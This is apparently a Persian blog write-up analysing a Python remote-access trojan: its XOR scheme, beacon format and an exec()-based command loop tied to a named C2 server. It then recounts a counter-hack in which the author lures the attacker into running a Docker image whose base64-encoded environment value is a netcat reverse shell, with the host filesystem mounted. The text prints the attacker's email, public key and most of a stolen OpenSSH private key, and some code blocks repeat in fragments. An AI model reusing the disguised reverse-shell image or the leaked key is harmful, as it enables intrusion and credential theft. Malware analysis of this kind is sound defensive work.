MakeRequestPacket(szContents): szCID = \u0026#34;FD429DEABE\u0026#34; szStep = \u0026#34;\\r\\n\\t\\tStep1 : KeepLink(P)\\r\\n\u0026#34; lszRequest = b\u0026#34;\u0026#34; lpRequest = bytearray() lpRequestEnc = bytearray() if len(szContents) == 0: szData = szStep + szPCode + \u0026#34;\\r\\n\u0026#34; + szComputerName + \u0026#34;\\r\\n\u0026#34; + szContents else: szData = szContents lszRequest = \u0026#34;id=\u0026#34; + szCID + \u0026#34;\u0026amp;oid=\u0026#34; + szObjectID + \u0026#34;\u0026amp;data=\u0026#34; lpRequest = get_bytes_from_unicode(szData) lpRequestEnc = xor_encrypt_decrypt(lpRequest,Key) szb64Data = base64.b64encode(lpRequestEnc).decode() lszRequest += szb64Data return lszRequest def encrypt_decrypt( Key) block_copy(lpContent, 0, lpCmdID, 0, 4) block_copy(lpContent, 4, lpDataLen, 0, 4) nCMDID = struct.unpack(\u0026#39;\u0026lt;i\u0026#39;,lpCmdID)[0] nDataLen = struct.unpack(\u0026#39;\u0026lt;i\u0026#39;,lpDataLen)[0] lpData = bytearray(nDataLen) block_copy(lpContent, 8, lpData, 0, nDataLen) lpData = encrypt_decrypt(lpData, 123) szCode = lpData.decode(\u0026#39;utf-8\u0026#39;) #szCodeArr[0] = szCode if nCMDID == 1001: exec(szCode) continue if nCMDID == 1002: time.sleep(60) continue continue except Exception as e: continue time.sleep(20) kbeps = \u0026#34;weeg\u0026#34; ุงุฒ din_dat ูู ููุทู ุงุตู RAT ูพุฏุง ุดุฏ. ุจุฑู ฺฉู ุชู ฺูุฏ ุชุง ุจุฎุด ุจุฑุฑุณุด ฺฉูู.\nุซุงุจุช ูุง ู ุขูุงุฏู ุณุงุฒ 1 2 3 4 5 6 7 8 9 trace = \u0026#34;iinniooiojnnawefoijonvbz1azxsdwwaaqzvw234ewxcvnoprtwqxv\u0026#34; Key = bytearray([3, 6, 2, 1, 6, 0, 4, 7, 0, 1, 9, 6, 8, 1, 2, 5]) def GetObjID(): return \u0026#39;\u0026#39;.join(random.choice(string.ascii_letters) for x in range(12)) def GetOSString(): return platform.platform() szObjectID = GetObjID() szPCode = \u0026#34;Operating System : \u0026#34; + GetOSString() szComputerName = \u0026#34;Computer Name : \u0026#34; + socket.gethostname() ุธุงูุฑุง ุฑุดุชูโ trace ุตุฑูุง ููุด ุชุฒุฆู ุฏุงุฑู ู ุฏุฑ ุงุฏุงูู ุงุณุชูุงุฏูโ ูุคุซุฑ ุงุฒุด ููุดู. ุชู ูุชุบุฑ Key ฺฉูุฏ ฑถุจุงุช ุจุฑุง XOR ู ุฑูุฒ ฺฉุฑุฏู ุฏุงุฏูโูุง ุจุฑุงยุงุฑุณุงู ุฏุฑุฎูุงุณุช ุจู C2 ู ุฑูุฒฺฏุดุง ูพุงุณุฎ ุฏุฑุงูุช ุงุฒ C2 ุจฺฉุงุฑ ูุฑู.ยุชุงุจุน GetObjID ูุฑ ุจุงุฑ ฺฉู ูุฑุงุฎูู ุจุดู ู ุดูุงุณูโ ฑฒุญุฑู ุชุตุงุฏู ูโุณุงุฒู ฺฉู ุชู ูพุงุฑุงูุชุฑ oid ุฏุฑุฎูุงุณุชโูุง ูุงุฏ ู ูุดุณุชโูุง ุฑู ุงุฒยูู ุฏฺฏู ุชูฺฉฺฉ ูโฺฉูู. ุชุงุจุน GetOSStringยุงุณู ู ูุดุฎุตุงุช ุณุณุชูโุนุงูู ุฑู ุจุฑูโฺฏุฑุฏููู ุชุง ุงุญุชูุงูุง ุจุนุฏุง ุชู ุชููโูุชุฑ ุงุณุชูุงุฏู ุจุดู. ููุฏุงุฑ szObjectID ูู ูููู ุดูุงุณูโ ุชุตุงุฏู ู ฺฉุชุง ุงู ฺุฑุฎูโุณุช.\nุชูุงุจุน ุฑูุฒูฺฏุงุฑ ู ฺฉูฺฉ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 def xor_encrypt_decrypt(data, key): result = bytearray() for i in range(len(data)): result.append(data[i] ^ key[i % len(key)]) return bytes(result) def get_bytes_from_unicode(text, encoding = \u0026#39;utf-16le\u0026#39;): return text.encode(encoding) def encrypt_decrypt( szRequest) szResponse = szResponse.replace(\u0026#39; \u0026#39;, \u0026#39;+\u0026#39;) if szResponse == \u0026#34;Succeed!\u0026#34;: time.sleep(20) continue lpContentEnc = base64.b64decode(szResponse) lpContent = xor_encrypt_decrypt(lpContentEnc, Key) block_copy(lpContent, 0, lpCmdID, 0, 4) block_copy(lpContent, 4, lpDataLen, 0, 4) nCMDID = struct.unpack(\u0026#39;\u0026lt;i\u0026#39;,lpCmdID)[0] nDataLen = struct.unpack(\u0026#39;\u0026lt;i\u0026#39;,lpDataLen)[0] lpData = bytearray(nDataLen) block_copy(lpContent, 8, lpData, 0, nDataLen) lpData = encrypt_decrypt(lpData, 123) szCode = lpData.decode(\u0026#39;utf-8\u0026#39;) #szCodeArr[0] = szCode if nCMDID == 1001: exec(szCode) continue if nCMDID == 1002: time.sleep(60) continue continue except Exception as e: continue time.sleep(20) kbeps = \u0026#34;weeg\u0026#34; ุชุงุจุน xor_encrypt_decrypt ฺฉ XOR ุจุง ฺฉูุฏ ฑถโุจุงุช ุงูุฌุงู ูโุฏูุ ุงู ูููู ูุงูโ ุจุฑูู ุฑูุฒฺฏุฐุงุฑ/ุฑูุฒฺฏุดุง ูุณ. ุชุงุจุน get_bytes_from_unicode ูุชู ุฑู ูุจู ุงุฒ XOR ุจู UTF-16LE ุชุจุฏู ูโฺฉูู. ุชุงุจุน encrypt_decrypt ู ุนููุงุช XOR ุชฺฉโุจุงุช ุจุง ฺฉูุฏ ุซุงุจุช ฑฒณ ุงุณุช ู ุฑู ุจุฏููโ ุฏุณุชูุฑ ุฏุฑ ุฌูุงุจ C2 ุงุนูุงู ูโุดูุ ุนู ุฌูุงุจโูุง ุฏู ูุงู XOR ุฏุงุฑูุฏ: ุจุฑูู ุจุง ฺฉูุฏ ฑถโุจุงุชุ ุฏุฑูู ุจุง ฑฒณ. block_copy ูู ููุดุด ุงูู ฺฉู ุงุฒ ุจุฏููโ ูพุงุณุฎุ ุฏุงุฏูโูุง ุฑู (ฺฉุฏ ุฏุณุชูุฑุ ฺฉุงููุฏุ ูุฏุฑ ู โฆ) ุจุฑ ุงุณุงุณ ุขูุณุช ุดูู ุงุณุชุฎุฑุงุฌ ฺฉูู.\nูุงูโ ุงูุชูุงู 1 2 3 4 5 6 7 8 def HTTP_POST(url, data): user_agent = \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\u0026#34; encoded_data = data.encode(\u0026#39;utf-8\u0026#39;) context = ssl._create_unverified_context() n_request = urllib.request.Request(url, data=encoded_data) n_request.add_header(\u0026#39;User-Agent\u0026#39;, user_agent) with urllib.request.urlopen(n_request, context=context, timeout = 60) as response: return response.read().decode(\u0026#39;utf-8\u0026#39;) ุฏุฑุฎูุงุณุชโูุง ุจุง urllib ุงุฑุณุงู ูโุดู. ุงุนุชุจุงุฑุณูุฌ TLS ุนูุฏุงู ุฎุงููุด ุดุฏู ุชุง ฺฏูุงูโูุง ูุงูุนุชุจุฑ(ุงูุถุง ูุดุฏู) ุจุง ุฎุทุง ููุงุฌู ูุดู. User-Agent ูู ููุดู ุซุงุจุชู.\nุณุงุฎุช ูพฺฉุช ุจุฑุง ุงุฑุชุจุงุท ุจุง c2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def MakeRequestPacket(szContents): szCID = \u0026#34;FD429DEABE\u0026#34; szStep = \u0026#34;\\r\\n\\t\\tStep1 : KeepLink(P)\\r\\n\u0026#34; lszRequest = b\u0026#34;\u0026#34; lpRequest = bytearray() lpRequestEnc = bytearray() if len(szContents) == 0: szData = szStep + szPCode + \u0026#34;\\r\\n\u0026#34; + szComputerName + \u0026#34;\\r\\n\u0026#34; + szContents else: szData = szContents lszRequest = \u0026#34;id=\u0026#34; + szCID + \u0026#34;\u0026amp;oid=\u0026#34; + szObjectID + \u0026#34;\u0026amp;data=\u0026#34; lpRequest = get_bytes_from_unicode(szData) lpRequestEnc = xor_encrypt_decrypt(lpRequest,Key) szb64Data = base64.b64encode(lpRequestEnc).decode() lszRequest += szb64Data return lszRequest ููุฏุงุฑ szCID ุงุญุชูุงูุง ุจู ุนููุงู ุดูุงุณูโ ฺฉููพู ุงุณุชูุงุฏู ูโุดู ฺฉู ููุดู ุซุงุจุช ู ุจุฑุงุจุฑ ุจุง FD429DEABE ู ููุฑุงู ุจุง oid (ุดูุงุณูโ ฑฒุญุฑู) ู data ุงุฑุณุงู ูโุดู. ููุช szContents ุฎุงู ุจุงุดูุ ุงุณฺฉุฑูพุช ุจุฑุง heartbeet ู ุง ูุนุฑู ุงูููโ ุฑุดุชูโ Step1 : KeepLink(P) ุฑู ุจูโ ููุฑุงู ุงุทูุงุนุงุช ุณุณุชู (szPCode/szComputerName/) ูพุฑ ูโฺฉูู. ุงู ูุชู ุจู UTF-16LE ุชุจุฏู ูโุดู ู ุจุง ฺฉูุฏ ฑถโุจุงุช XOR ูุดู ู ุฏุฑููุงุช Base64 ุงูฺฉุฏ ูโุดู. ุฎุฑูุฌ ููุง ุจุฏููโ POST ูุณุช ุจู ูุฑู ุฒุฑ ุงุฌุงุฏ ูุดู:\n1 id=FD429DEABE\u0026amp;oid=\u0026lt;12char\u0026gt;\u0026amp;data=\u0026lt;Base64(XOR_16(UTF-16LE(payload)))\u0026gt; ุญูููโ ูุฑูุงูุฏู ู ฺฉูุชุฑู (C2 Loop) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 szContents = \u0026#34;\u0026#34; while True: lpCmdID = bytearray(4) lpDataLen = bytearray(4) nCMDID = 0 nDataLen = 0 nLen = 0 szCode = \u0026#34;\u0026#34; szCodeArr = [\u0026#34;new string\u0026#34;] szRequest = \u0026#34;\u0026#34; szResponse = \u0026#34;\u0026#34; lpContent = bytearray() lpData = bytearray() lpContentEnc =bytearray() try: szRequest = MakeRequestPacket(szContents) szContents = \u0026#34;\u0026#34; szResponse = HTTP_POST(url, szRequest) szResponse = szResponse.replace(\u0026#39; \u0026#39;, \u0026#39;+\u0026#39;) if szResponse == \u0026#34;Succeed!\u0026#34;: time.sleep(20) continue lpContentEnc = base64.b64decode(szResponse) lpContent = xor_encrypt_decrypt(lpContentEnc, Key) block_copy(lpContent, 0, lpCmdID, 0, 4) block_copy(lpContent, 4, lpDataLen, 0, 4) nCMDID = struct.unpack(\u0026#39;\u0026lt;i\u0026#39;,lpCmdID)[0] nDataLen = struct.unpack(\u0026#39;\u0026lt;i\u0026#39;,lpDataLen)[0] lpData = bytearray(nDataLen) block_copy(lpContent, 8, lpData, 0, nDataLen) lpData = encrypt_decrypt(lpData, 123) szCode = lpData.decode(\u0026#39;utf-8\u0026#39;) #szCodeArr[0] = szCode if nCMDID == 1001: exec(szCode) continue if nCMDID == 1002: time.sleep(60) continue continue except Exception as e: continue time.sleep(20) kbeps = \u0026#34;weeg\u0026#34; ุฏุฑ ูุฑ ฺุฑุฎูุ ุจุณุชู  ุฏุฑุฎูุงุณุช ุณุงุฎุชู ู ุจู https://searchbox[.]info/prefer.php ุงุฑุณุงู ูุดู. ูพุงุณุฎ ุฏุฑุงูุช ุงฺฏู ุฏููุง ยซSucceed!ยป ุจุงุดูุ ููุด ุฒูุฏู ูฺฏู ุฏุงุดุชู ฺฉุงูฺฉุดู ุฑู ุฏุงุฑู ู ุจุฏุงูุฒุงุฑ ฒฐ ุซุงูู ูฺฉุซ ู ฺฉูู ู ุฏูุจุงุฑู ู ุฏุฑุฎูุงุณุช ุจู ุณุฑูุฑ ููุฑุณุชู. ุฏุฑ ุบุฑ ุงูุตูุฑุชุ ุงุจุชุฏุง ุงุฒ Base64-decodingุ ูุงู  ุจุฑูู ุฏุงุฏูโ ุฏุฑุงูุช ุดุฏู ุจุง XOR ฺฉูุฏ ฑถุจุงุช ุจุงุฒ ู ุดู.ยูุฑูุช ฺฉู ูพุงุณุฎ ุณุฑูุฑ ุงู ุดฺฉูู:\n1 b64( XOR16( [ 4B CMDID|LE ][ 4B DATALEN|LE ][ DATALEN bytes payload ] ) ) ูุฏุฑ ูพุงุณุฎ ธ ุจุงุช ุทูู ุฏุงุฑู: ด ุจุงุช ุงูู ุดูุงุณู  ุฏุณุชูุฑ (nCMDID) ู ด ุจุงุช ุจุนุฏ ุทูู ุฏุงุฏู (nDataLen). ุจุนุฏ ุจู ุงูุฏุงุฒู  nDataLen ุจุงุช ุฏุงุฏู ุจุนุฏ ุงุฒ ูุฏุฑ ุจุฑุฏุงุดุชู ู ุดูุ ุจุง ฺฉูุฏยฑฒณ (0x7B)ยXORยูุดู ู ุจู UTF-8 ุชุจุฏู ูุดู. ุฎุฑูุฌ ูู ุจุงุฏ ฺฉุฏ ูพุงุชูู ุจุงุดู. ุงฺฏุฑ nCMDID ุจุฑุงุจุฑ 1001 ุจุงุดุฏุ ููู ฺฉุฏ ุจุง exec ุฑู ุณุณุชู ุงุฌุฑุง ูุดู. ุงฺฏุฑ 1002 ุจุงุดุฏุ ถฐ ุซุงูู ูฺฉุซ ูฺฉูู.ยุฌูุน ุจูุฏ ุงู ุจุฏุงูุฒุงุฑ ู RAT ูููุงูุ ุงูุง ูุงูุนุง ฺฉุงุฑ ุฑุงู ุงูุฏุงุฒ ูุณุช. ุจุง ูุฑ ุจุงุฑ ุจฺฉูู ุฒุฏู(beacon)ุ ู ุจุณุชู  ูุชู ุดุงูู ุดูุงุณูโ ฺฉููพูุ ุดูุงุณูโ ฑฒุญุฑู ฺฉูุงูุช ู ุฏุงุฏูโ ุฑูุฒุดุฏู ุจู C2 ูโูุฑุณุชู. ูพุงุณุฎ ุฑู ุชู ุฏู ูุงู XOR ุจุงุฒ ูโฺฉูู ู ุฏุฑ ุตูุฑุช ูุงุฒุ ูุชู ุฏุฑุงูุช ุฑู ูุณุชููุง ุจุง exec ุงุฌุฑุง ูโฺฉูู. ูุจูุฏ ูุงฺูู ูุง ุฌุงูุจ ุจู ูุนู ูุญุฏูุฏ ุจูุฏู ุชูุฏุฏ ูุณุชุ ฺูู ุจุง ู ุฏุณุชูุฑ 1001ุ ูุฑ ูุงุจูุช ูุดู ุฏุฑ ูุญุธู ุฑู ุนุงูู ูุฑุจุงู ุชุฒุฑู ู ุงุฌุฑุง ุจุดู. ุฎูุงุตู ุจู ูุญุถ ุจุฑูุฑุงุฑ ุงุฑุชุจุงุท ููููุ ููุงุฌู ุงุฎุชุงุฑ ฺฉุงูู ุงุฌุฑุง ฺฉุฏ ุฑู ุณุณุชู ุฑู ุฏุงุฑู.ยุฎุจ ุงูุฌุง ูู ุฏฺฏู ู ุดูุงุฎุช ฺฉุงู ุงุฒ ุงุณฺฉุฑูพุช ู ููุดูโ ููุงุฌู ุฏุณุชู ุงููุฏ. ฺฉู ูฺฉุฑ ฺฉุฑุฏู ฺฉู ฺฺฉุงุฑุง ูุดู ฺฉุฑุฏ ู ุงุตูุง ฺูุฏุฑ ุฏฺฏู ุฑูุด ููุช ุจุฒุงุฑู. ุจู ูุธุฑู ุฑุณุฏ ุฎูุจู ฺฉู ุณุน ฺฉูู ููุงุฌู ุฑู ุชู ุชูู ุจูุฏุงุฒู ู ฺฉู ฺฏูุด ูุงูุด ุจุฏู. ูพุณ ู ููุดู ฺฉุดุฏูุ ุจุง ูููู ุงุฏูโุง ฺฉู ููุงุฌู ุงููุฏ ุณุฑุงุบโููู ุจุฑู ุณุฑุงุบุด. ููุดู ุงู ุจูุฏ ุจูุด ุจฺฏู ฺฉู ุขูุง ูู ฺฉุงุฑ ุฑู ุขูุงุฏู ฺฉุฑุฏู ูู ุจู ุจููููโ ูพุงุฏุงุฑ ูุจูุฏู ุงูุชุฑูุช ุงุฑุงูุ ููุชุฑูฺฏ ู ฺฉู ุณุงุฏู ููุญ ุฌููู ุฏุงุฏู ุฎูุฏู ุจูุด ุจฺฏู ุญุงุฌ ุจุง ูุตู ุดู ุฎูุฏุช ุจู ุณุณุชูู ุชุณุช ุจฺฏุฑ. ุจูุด ุจฺฏู ฺฉูุฏ sshุช ุฑู ุจุฏู ู ูู ุจุฒุงุฑู ุชู ุณุณุชู ุชููู ุจูุฑูุง ุจุง ุฏุงุฎู๐.ยุจุงุฒ ุจุฑุนฺฉุณ: ูุฑุจ ููุงุฌู ุจุง Dockerfile ุงุฒ ุงูุฌุง ุจู ุจุนุฏ ฺฉ ุงุฒ ุจฺู ูุง ุชู ุฑู ุตุฏุง ฺฉุฑุฏู ฺฉู ุจุงูู ุจุฑู ุณุฑุงุบุด. ุชุตูู ฺฏุฑูุชู ุงุฒ ูููู ุชุฑููุฏ ุฎูุฏุด ุนูู ุฎูุฏุด ุงุณุชูุงุฏู ฺฉูู. ฺูู ุงุฒ ูุง Dockerfile ุฎูุงุณุชู ุจูุฏุ ฺฉ ุงูุฌ ุฏุฑุณุช ฺฉุฑุฏู ฺฉู ุฏุฑ ูุงูุน ุจู ูุญุถ ุงุฌุฑุง ุจู ูุง reverse shell ู ุฏุงุฏ.\n1 while true; do rm /tmp/f 2\u0026gt;/dev/null; mkfifo /tmp/f; cat /tmp/f | sh -i 2\u0026gt;\u0026amp;1 | nc 1.2.3.4 3000 \u0026gt; /tmp/f; sleep 5; done ูููุณุช ุงูุฌโููู ุงู ุดฺฉู ุดุฏ:\n1 2 3 4 Dockerfile FROM alpine:latest RUN apk add --no-cache netcat-openbsd ENV KEY=\u0026#34;d2hpbGUgdHJ1ZTsgZG8gcm0gL3RtcC9mIDI+L2Rldi9udWxsOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgc2ggLWkgMj4mMSB8IG5jIDEuMi4zLjQgMzAwMCA+IC90bXAvZjsgc2xlZXAgNTsgZG9uZQ==\u0026#34; ููู ุทูุฑ ุงู ุงูุฌ ุจุงุฏ ุทูุฑ ุฑุงู ู ุดุฏ ฺฉู ูููุน ุงุฌุฑุง ฺฉู ูุณุฑ \u0026quot;/\u0026quot; ุณุณุชู ุนุงูู ูุฑุจุงู ุฑู ูู ุฏุงุฎู ฺฉุงูุชูุฑ ูููุช ู ฺฉุฑุฏุ ุนู ุนููุงู ูุง ุฏุณุชุฑุณ ูุณุชูู ุจู ูุงู ุณุณุชูุด ูพุฏุง ู ฺฉุฑุฏู.\n1 sudo docker run -v /:/host -it --rm xyz9045/84.26.14.40 ุงฺฏู ุฏูุช ฺฉูุฏ ุงุณู ุงูุฌ ุฑู ุทูุฑ ุงูุชุฎุงุจ ฺฉุฑุฏู ฺฉู ุดุจู ู ุขุฏุฑุณ ุขูพ ุดุฏู 84.26.14.40 ุชุง ูฺฉุฑ ฺฉูู ูุงูุนุง ุฏุงุฑู ุจู ุงู ูุงุดู ูุตู ูุดู! ุงู ุขูพ ุฑู ููู ุทูุฑ ุฑูุฏูู ุงูุชุฎุงุจ ฺฉุฑุฏู.\nุฎูุงุตู ุชู ูฺฉุงููููู ุชู ุชูฺฏุฑุงู ุฎุฑุด ฺฉุฑุฏูุ ูู ุจุฑุงุด ููุดุชู: ยซุขูุง ุงูุชุฑูุช ุงุฑุงู ุฏุงุบูููุ ุจุง ูุณุชูู ุฑู ุณุณุชู ูู ูุตู ุดูุ ุฎูุฏุช ุฎุฑูุฌ ูพุฑูฺู ุฑู ุจุฑุฑุณ ฺฉู.ยป ุงูููุฑ ุงูู ูู ุญุณุงุจ ุฐูู ฺฉุฑุฏู ุจูุฏ ู ฺฉูุฏ ุนููู SSH ุฎูุฏุด ุฑู ูุฑุณุชุงุฏ:\n1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCgIROy2BYmbTwhp/TWnkmFHIigCrioS6Wl3yd2n8KNm7mB/D6Ino0VqdT92LRD8ryaIFEYKKPoBt7giDMjrITql3gx8apIk8SM+3+ub6cEiNJZqyM9emRQSl4BKYXV5FqSdRlGGY49+IQLl2B+jh7Gc3wpJTI5Aot9zn+hEKnB+i6Tb+n+U6+hep6QYtCIAL+gM+JKYui1L13klf/CXxy7PWt6nOnFih/PwxKAWBrE4O96/fFfSyBiXt1iiG0hY/FyM2uD9EHg2H1oWxmBhHVtByehYZmHFyi7kpCkLONXwSA4vAUqGPk2VB8Vvf3leb1yJHtEoIDAf9r//cWV2fkAMD8vuZThLJD4yBpYX24DgvvK/ZNVcakSTTvog2Tv0V347iVLufyaPgIaCKls3m0mjaSd0wJTaB6RaEz388ii98NHF1WAaXS06K8pJ//94eD1vVb6sJh9tqJupbVpieUzRSZVTGK7nyxg0edC9H56NHoaEiEXL2Vvs5/fDpTQbwLtQRRRQnVdcrF4/W/n/XopWFsHOfl5E/xlesIbVtWWekLx8sf447U8osjiXnY8FJobdPv70gknORRjEyLfy0J7y99JRH26yJTcssw8o1wGQdFm8DtmUgxDT3q3mfigtYyEAk6irIN0chqDjGWIiUUGY4pOUNM5wSWdypGUZ9oLqw== harryking940610@gmail.com ุจุฑุง ุงูฺฉู ุฏูุนูโ ุงูู ุจุชููู ูุตู ุดู ู ุงุนุชูุงุฏุด ุฌูุจ ุดู ุชุตูู ฺฏุฑูุชู ุฑู ุณูุฏุจุงฺฉุณโููู ู SSH ุงฺฉุณุณ ูููุช ูู ุชู ูุงูโูพุงุช ุจูุด ุจุฏู. ูุง ูู ูุงูโูพุงุช Cowrie ุจุงูุง ุขูุฑุฏู. ุงุฑู ููุช ุณุน ูโฺฉุฑุฏ ูุงุฑุฏ ุดู (5.223.53[.]161 ุงูพุด ุงู ุจูุฏ)ุ ูฺฉุฑ ูโฺฉุฑุฏ ูุงูุนุงู ุฑู ูุงุดู ูู ูุณุช!ยุจุนุฏุด ุชู ุชูฺฏุฑุงู ูพุงู ุฏุงุฏ ฺฉู ุขูุง ูุตู ููุดู. ุงูุฌุง ุฏฺฏู ูุฑุจุงู ฺฉุงููุง ุขูุงุฏู ุจูุฏ ฺฉู ุทุนููโุง ฺฉู ุจุฑุงุด ฺฏุฐุงุดุชู ุจูุฏู ุฑู ฺฏุงุฒ ุจฺฏุฑู! ู ุฌููู ุณุฑูู ฺฉุฑุฏู ฺฉู ุจุง ุงู ฺฉุงููุฏ ุฑู ุจุฒู ุงุตูุง ูุตูโุดู ุจู ุณุณุชู ูู ุฏฺฏู ููุชุฑูฺฏ ู ูุงุฑูุงู ุงูุงุฑู ุจุงูพุณ ฺฉู:\n1 $ sudo docker run -v /:/host -it --rm xyz9045/84.26.14.40 ฺฉู ุดฺฉ ฺฉุฑุฏ ฺฏูุช ูุงูุนุง ุฏุงฺฉุฑุ ฺฏูุชู ุจูู ุจุฒู ูุตู ูุด. ูุชุฌูุ ฺฉุงููุฏ ุฑู ุฒุฏ ู ูุง ุงุฒ ุณุณุชูุด reverse shell ฺฏุฑูุชู.ยุณุฑุน ฺูุฏุชุง ฺฉุงููุฏ ุฒุฏู ู ู ุณุฑ ุฎุฑูุฌ ุฑู ฺฺฉ ฺฉุฑุฏู ู ุฏุฏู ฺฉู ุฎุจ ฺฉู ูุญุงูุธู ฺฉุงุฑ ูุณุช ู ุงูู ุชู ฺฉ ุงุฒ VMูุง ฺฉู ุจู ุนููุงู VPN Serverุด ูุณุช ุงุฌุฑุง ฺฉุฑุฏู. ุฏุฑ ููุงุช ุจุฑุง ุงุทููุงูุ private keyุด ุฑู ูู ุจุฑูู ฺฉุดุฏู:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 -----BEGIN OPENSSH PRIVATE KEY----- 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 